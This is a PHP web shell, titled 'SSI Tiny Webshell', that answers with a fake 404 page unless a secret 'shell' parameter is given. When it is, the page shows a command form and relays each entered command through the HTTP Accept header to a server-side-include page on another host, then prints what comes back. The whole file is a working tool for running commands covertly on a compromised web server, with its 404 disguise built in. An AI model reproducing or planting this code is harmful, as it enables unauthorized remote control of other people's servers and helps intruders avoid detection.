<?php
if(!isset($_GET['shell']) == 'on') {
	header("HTTP/1.0 404 Not Found");
	exit();
} else {
	$url = 'http://www.example.com/ssi.shtml';
	$cmd = isset($_POST['cmd']) ? http_send($url, $_POST['cmd']) : '';
?>
<html>
	<head>
		<title>SSI Tiny Webshell</title>
	</head>
	<body>
		<form method="POST">
			<table>
				<tr>
					<td>Command:</td>
					<td><input type="text" name="cmd" value="<?=(isset($_POST['cmd']) ? $_POST['cmd'] : ''); ?>" />&nbsp;<input type="submit" name="submit" value="Run" /></td>
				</tr>
				<tr>
					<td>&nbsp;</td>
					<td colspan="2"><textarea cols="100" rows="20"><?=$cmd;?></textarea></td>
				</tr>
			</table>
		</form>
	</body>
</html>
<?php
}
function http_send($url, $cmd) {
	$opts = array('http' => array('method' => "GET", 'header' => "User-agent: {$_SERVER['HTTP_USER_AGENT']}\r\nAccept: {$cmd}\r\n"));
	$context = stream_context_create($opts);
	$html = file_get_contents($url, false, $context);
	return($html);
}
?> 